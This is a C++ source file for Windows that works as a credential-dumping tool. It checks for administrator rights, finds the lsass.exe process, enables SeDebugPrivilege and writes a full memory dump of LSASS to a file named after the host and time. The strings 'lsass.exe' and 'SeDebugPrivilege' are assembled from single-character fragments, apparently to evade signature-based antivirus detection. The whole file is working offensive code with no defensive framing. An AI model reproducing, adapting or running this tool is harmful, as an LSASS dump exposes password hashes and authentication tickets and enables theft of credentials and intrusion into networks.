#pragma comment (lib, "Dbghelp.lib")
#pragma comment (lib, "Ws2_32.lib")
#pragma warning(disable : 4996)
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#include <sstream>
#define UNCLEN 512
using namespace std;


//check is admininstrator privilege
BOOL IsElevatedProcess()
{
	BOOL is_elevated = FALSE;
	HANDLE token = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
	{
		TOKEN_ELEVATION elevation;
		DWORD token_sz = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &token_sz))
		{
			is_elevated = elevation.TokenIsElevated;
		}
	}
	if (token)
	{
		CloseHandle(token);
	}
	return is_elevated;
}


DWORD getProcessPid()
{
	DWORD processPID = 0;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	LPCWSTR processName = L"";
	if (Process32First(snapshot, &processEntry)) {
		string str1 = "l";
		string str2 = ".";
		string str3 = "s";
		string str4 = "e";
		string str5 = "a";
		string str6 = "x";
		string processname_str = str1 + str3 + str5 + str3 + str3 + str2 + str4 + str6 + str4;//lsass.exe
		wstring processname(processname_str.begin(), processname_str.end());
		const wchar_t* szName = processname.c_str();
		//find the lsass.exe in this session
		while (_wcsicmp(processName, szName) != 0) {
			Process32Next(snapshot, &processEntry);
			processName = processEntry.szExeFile;
			processPID = processEntry.th32ProcessID;
		}
	}
	return processPID;
}


bool SetPrivilege()
{
	string str1 = "S";
	string str2 = "P";
	string str3 = "e";
	string str4 = "r";
	string str5 = "D";
	string str6 = "i";
	string str7 = "b";
	string str8 = "v";
	string str9 = "u";
	string str10 = "l";
	string str11 = "g";//SeDebugPrivilege
	string privilegename_str = str1 + str3 + str5 + str3 + str7 + str9 + str11 + str2 + str4 + str6 + str8 + str6 + str10 + str3 + str11 + str3;
	wstring privilege_name(privilegename_str.begin(), privilegename_str.end());
	const wchar_t* privName = privilege_name.c_str();
	// Adjust token privileges
	TOKEN_PRIVILEGES priv = { 0,0,0,0 };
	HANDLE hToken = NULL;
	LUID luid = { 0,0 };
	BOOL Status = true;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		Status = false;
		goto EXIT;
	}
	if (!LookupPrivilegeValueW(0, privName, &luid))
	{
		Status = false;
		goto EXIT;
	}
	priv.PrivilegeCount = 1;
	priv.Privileges[0].Luid = luid;
	priv.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;
	if (!AdjustTokenPrivileges(hToken, false, &priv, 0, 0, 0))
	{
		Status = false;
		goto EXIT;
	}
EXIT:
	if (hToken)
		CloseHandle(hToken);
	return Status;
}


string getHostname() {
	TCHAR compname[UNCLEN + 1];
	DWORD compname_len = UNCLEN + 1;
	GetComputerName((TCHAR*)compname, &compname_len);
	wstring wstringcompname(&compname[0]);
	string stringcompname(wstringcompname.begin(), wstringcompname.end());
	return stringcompname;
}

//generate the output filename
string getFileName(string hostname) {
	// Extension of the file
	string extension = ".txt";
	// Get time
	time_t t = time(NULL);
	tm* timePtr = localtime(&t);
	// Create filename. Format: hostname_01-12-2021-1200
	string minutes;
	if (timePtr->tm_min < 10) {
		minutes = "0" + to_string(timePtr->tm_min);
	}
	else {
		minutes = to_string(timePtr->tm_min);
	}
	stringstream filenamestream;
	string filename;
	filenamestream << hostname;
	filenamestream << "_";
	filenamestream << timePtr->tm_mday;
	filenamestream << "-";
	filenamestream << timePtr->tm_mon + 1;
	filenamestream << "-";
	filenamestream << timePtr->tm_year + 1900;
	filenamestream << "-";
	filenamestream << timePtr->tm_hour;
	filenamestream << minutes;
	filenamestream << extension;
	filenamestream >> filename;
	return filename;
}


int main(int argc, char** argv) {
	// Check elevated process
	if (!IsElevatedProcess()) {
		wcout << "[-] Error: Execute with administrative privileges." << endl;
		return 1;
	}

	// Get process PID
	DWORD processPID = getProcessPid();
	wcout << "[+] Process PID: " << processPID << endl;

	// Get name for dump file
	string filename;
	if (argc >= 2) {
		// Use custom name from first input argument
		filename = argv[1];
	}
	else {
		// Get hostname and generate file name
		string hostname = getHostname();
		filename = getFileName(hostname);
	}
	wstring stemp = wstring(filename.begin(), filename.end());
	LPCWSTR pointer_filename = stemp.c_str();

	// Create output file
	HANDLE outFile = CreateFile(pointer_filename, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	// Enable SeDebugPrivilege privilege
	BOOL privAdded = SetPrivilege();
	if (!privAdded) {
		wcout << "[-] Error: Necessary privilege could not be added." << endl;
		return 1;
	}

	// Create handle to the process
	DWORD processRights = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION; // PROCESS_ALL_ACCESS;
	HANDLE processHandle = OpenProcess(processRights, 0, processPID);

	// Dump process
	if (processHandle && processHandle != INVALID_HANDLE_VALUE) {
		wcout << "[+] Handle to process created correctly." << endl;
		BOOL isDumped = MiniDumpWriteDump(processHandle, processPID, outFile, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
		if (isDumped) {
			cout << "[+] Successfully dumped process with pid " << processPID << " to file " << filename << endl;
		}
		else {
			cout << "[-] Error: Process not dumped." << endl;
			return 1;
		}
	}
	else {
		wcout << "[-] Error: Handle to process is NULL." << endl;
		return 1;
	}

	return 0;
}
